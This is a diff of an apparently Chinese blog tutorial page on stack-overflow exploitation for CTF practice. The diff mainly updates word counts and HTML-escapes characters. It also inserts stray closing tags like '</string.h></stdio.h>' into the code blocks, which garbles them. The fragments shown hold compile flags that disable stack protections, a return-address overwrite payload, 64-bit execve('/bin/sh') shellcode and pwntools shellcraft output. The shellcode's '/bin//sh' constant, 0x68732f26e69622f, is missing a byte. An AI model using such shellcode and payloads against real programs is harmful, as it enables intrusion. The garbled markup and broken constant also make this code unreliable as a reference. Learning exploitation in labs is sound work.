@@ -344,14 +344,14 @@
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        1.8k
+                        2.1k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        7 分
+                        9 分
                     </div>
                     
                 
@@ -406,7 +406,7 @@ int main(void)
 
     return 0;
 }
-</code></pre>
+</string.h></stdio.h></code></pre>
 <p>编译命令：</p>
 <pre class=" language-lang-txt"><code class="language-lang-txt">gcc -z execstack -fno-stack-protector//关闭cannary nx保护
 </code></pre>
@@ -417,14 +417,14 @@ int main(void)
                                            |     retaddr     |
                                            +-----------------+
                                            |     saved ebp   |
-                                    ebp--->+-----------------+
+                                    ebp---&gt;+-----------------+
                                            |                 |
                                            |                 |
                                            |                 |
                                            |                 |
                                            |                 |
                                            |                 |
-                            buf,ebp-0xc---->+-----------------+
+                            buf,ebp-0xc----&gt;+-----------------+
 </code></pre>
 <p>那么如果我们读取字符串：</p>
 <pre class=" language-lang-txt"><code class="language-lang-txt">0x6c*'a'+'bbbb'+success_addr//success_addr为我们想要跳转的地址
@@ -438,14 +438,14 @@ int main(void)
                                            |  success_addr   |
                                            +-----------------+
                                            |       bbbb      |
-                                    ebp--->+-----------------+
+                                    ebp---&gt;+-----------------+
                                            |                 |
                                            |                 |
                                            | 'a'*0x6c        |
                                            |                 |
                                            |                 |
                                            |                 |
-                              s,ebp-0x64-->+-----------------+
+                              s,ebp-0x64--&gt;+-----------------+
 </code></pre>
 <p>由于存在strncpy（buf2,buf,100）,因此我们可以把shellcode通过buf写入到buf2中，然后我们知道buf2的地址，即：buf2的地址就是shellcode的起始地址，我们在将返回地址修改为buf2的地址，程序没有开启NX,程序数据中的shellcode可以执行，返回shell</p>
 <p>exp:</p>
@@ -514,14 +514,14 @@ _start:
    push eax
    int 0x80
 */
-</code></pre>
+</stdio.h></string.h></code></pre>
 <p>shellcode64:</p>
 <pre class=" language-lang-shell"><code class="language-lang-shell">/** 
  *
  *   _   _            _            ____       _ _ 
  *  | | | | __ _  ___| | ___ __   |  _ \ ___ | | |
  *  | |_| |/ _` |/ __| |/ / '_ \  | |_) / _ \| | |
- *  |  _  | (_| | (__|   <| | | | |  _ < (_) | | |
+ *  |  _  | (_| | (__|   &lt;| | | | |  _ &lt; (_) | | |
  *  |_| |_|\__,_|\___|_|\_\_| |_| |_| \_\___/|_|_|
  *           [ http://www.hacknroll.com ]
  *
@@ -579,8 +579,8 @@ int main(void)
     add rax,0x3b    ;syscall_64.tbl
     xor rdi,rdi        ;clear rdi
     push rdi
-    mov rdi,0x68732f26e69622f    ;hs//nib/==>bin/sh写入rdi
-    push rdi        ;push stark(rsp-=8) 现在rsp==>bin/sh
+    mov rdi,0x68732f26e69622f    ;hs//nib/==&gt;bin/sh写入rdi
+    push rdi        ;push stark(rsp-=8) 现在rsp==&gt;bin/sh
     lea rdi,[rsp]    ;rdi=rsp(%rdi,%rsi,%rdx,%rcx,%r8,%r9用作函数参数，依次对应第一、第二参数)取bin/sh的地址放到rdi里
     xor rsi,rsi        ;clear rsi
     xor rdx,rdx        ;clear rdx
@@ -593,7 +593,7 @@ objcopy -O binary shasm.o.code 提取其中的shellcode部分
 xxd code 显示方便
 </code></pre>
 <h2 id="0x60-pwntoos-shellcraft-sh"><a href="#0x60-pwntoos-shellcraft-sh" class="headerlink" title="0x60 pwntoos shellcraft.sh()"></a>0x60 pwntoos shellcraft.sh()</h2><pre class=" language-lang-txt"><code class="language-lang-txt">/* execve(path='/bin///sh', argv=['sh'], envp=0) */
-    /* push '/bin///sh\x00' */ ==>0x68732f26e69622f
+    /* push '/bin///sh\x00' */ ==&gt;0x68732f26e69622f
     push 0x68
     push 0x732f2f2f
     push 0x6e69622f        
@@ -845,7 +845,7 @@ Canary：-fn</div>
 
             
                 &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;
-                <span class="white-color">31.9k</span>
+                <span class="white-color">33.8k</span>
             
 
             
